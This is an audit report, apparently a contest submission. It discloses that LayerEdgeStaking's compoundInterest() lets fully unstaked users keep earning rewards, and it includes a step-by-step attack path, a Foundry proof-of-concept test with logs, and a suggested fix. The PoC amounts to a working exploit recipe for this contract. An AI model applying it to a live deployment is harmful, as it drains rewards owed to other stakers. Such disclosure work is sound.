# User can steal rewards when `compoundingEnabled` is set to true.

### Summary

LayerEdgeStaking simply allows users to stake $EDGEN tokens to earn rewards over time. Interests in form of rewards can also be compounded into the user's already staked assets for the user to withdraw their tokens and earn rewards together with the withdrawn tokens, although a user can only compound his interest when `compoundingEnabled` is set to true by the admin . The expected flow should work just fine,  but because there is no check in the `LayerEdgeStaking::compoundInterest()` function to ensure that a user who has already completely unstaked his token shouldn't be able to call `compoundInterest()`, when `compoundingEnabled` is set to true,  a malicious user can re-enter into the staking mechanism to steal rewards after completely withdrawing his asset from the protocol.

### Root Cause

In   `LayerEdgeStaking::compoundInterest()`  there is no check to ensure that a user who has completely withdrawn his asset shouldn't be able to compound interests, because he has no asset left in the protocol.

### Internal Pre-conditions

This is a simple attack, the admin just needs to set `compoundingEnabled` to true.

### External Pre-conditions

no response

### Attack Path

1. User calls `stake()` with some amount of tokens, 1000 $EDGEN .
2. User waits for some days or months for rewards to accumulate.
3. User calls `unstake()` and queues his assets to be completely finalized after 7 days.
4. After 7 days, user call `completeUnstake()` to completely withdraw all his assets from the protocol.
5. Admin sets `compoundingEnabled` to `true`
6. User then calls `compoundInterest()`, thereby adding his rewards to his non existing balance.
7. After some  time rewards gets accumulated and the user withdraws the rewards by calling `claimInterest()`.

the user can repeat this process without staking anymore asset, to steal rewards from the protocol.

### Impact

The protocol loses a significant amount of rewards through the process described above.

### PoC

add the following test in `LayerEdgeStakingTest.t.sol` and run `forge test --mt test__Poc -vvv` to veiw the logs

```solidity
 function test__Poc() public {
    
        //Alice stakes some amount of assets
        vm.startPrank(alice);
        token.approve(address(staking), MIN_STAKE);
        staking.stake(MIN_STAKE);
        vm.stopPrank();
       
        // Advance time by 30 days
        vm.warp(block.timestamp + 30 days);
       
        //user unstakes his assests
        vm.startPrank(alice);
        staking.unstake(MIN_STAKE);
        //time travel so user can compeletly unstake
        vm.warp(block.timestamp + 7 days + 1);
        staking.completeUnstake(0);
        vm.stopPrank();
        //pending rewards and balance after the user completely unstakes

         (uint256 balance,,, uint256 pendingRewards) = staking.getUserInfo(alice);
         console2.log("user balance after completely unstaking", balance);
        console2.log("pendingRewards after completely unstaking", pendingRewards);
        
        
         //admin sets  compoundingEnabled to true
        vm.startPrank(admin);
        staking.setCompoundingStatus(true);
        vm.stopPrank();
        
        //alice then further compounds interest
        vm.startPrank(alice);
          staking.compoundInterest();
         vm.stopPrank();

         //Wait for some days..
         //gets the new balance and pending rewards of alice
         vm.warp(block.timestamp + 30 days);
         (uint256 newBalance1,,, uint256 pendingRewardsAfter) = staking.getUserInfo(alice);
         console2.log("user balance after the attack", newBalance1); 
         console2.log("pendingRewardsAfter The attack", pendingRewardsAfter);  
         
    }
```
```bash
Logs:
  user balance after completely unstaking 0
  pendingRewards after completely unstaking 123287671232876712328
  user balance after the attack 123287671232876712328
  pendingRewardsAfter The attack 2026646650403452805

```
From the logs shown above, the malicious user uses rewards to re-enter into the protocol to steal more rewards. The malicious user can continue this process over and over again without needing to stake any asset to steal rewards from the protocol

### Mitigation

Consider implementing a check not to allow users who already left the protocol to be able to compound interest.
